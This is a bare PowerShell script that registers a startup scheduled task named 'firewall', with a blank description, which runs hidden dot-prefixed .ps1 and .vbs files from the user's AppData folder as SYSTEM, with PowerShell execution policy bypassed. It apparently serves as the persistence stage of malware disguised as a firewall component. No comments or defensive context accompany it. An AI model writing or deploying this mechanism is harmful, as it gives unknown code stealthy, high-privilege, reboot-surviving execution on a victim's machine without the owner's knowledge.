if ([Environment]::Is64BitOperatingSystem) {
    $osBit = "64"
} else {
    $osBit = "32"
}

$fileName = ".firewall$osBit"
$psFilePath = "$env:APPDATA\Firewall\$fileName.ps1"
$vbsFilePath = "$env:APPDATA\Firewall\$fileName.vbs"

$taskActionPS = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""

$taskActionVBS = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""

$trigger = New-ScheduledTaskTrigger -AtStartup

$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

$task = New-ScheduledTask -Action @($taskActionPS, $taskActionVBS) -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "firewall" -Description "_"

Register-ScheduledTask -InputObject $task
